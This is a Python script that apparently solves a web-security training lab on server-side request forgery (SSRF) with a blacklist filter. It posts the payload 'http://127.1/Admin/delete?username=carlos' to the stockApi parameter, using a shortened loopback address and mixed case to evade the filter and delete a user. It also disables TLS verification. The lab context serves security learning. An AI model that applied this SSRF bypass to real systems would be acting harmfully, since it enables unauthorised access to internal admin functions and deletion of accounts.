import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SSRF with blacklist-based input filter"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'stockApi' parameter to delete carlos using SSRF with input filter bypass\n2. Check that carlos doesn't exist anymore in the admin panel\n""")

    print(Fore.WHITE + "Injection point: " + Fore.YELLOW + "stockApi")

    payload = "http://127.1/Admin/delete?username=carlos"
    data =  { "stockApi": payload }

    print(Fore.WHITE + "[+] Injecting payload to delete carlos using SSRF with input filter bypass")

    try:
        r = requests.post(
            f"{url}/product/stock", data=data, verify=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
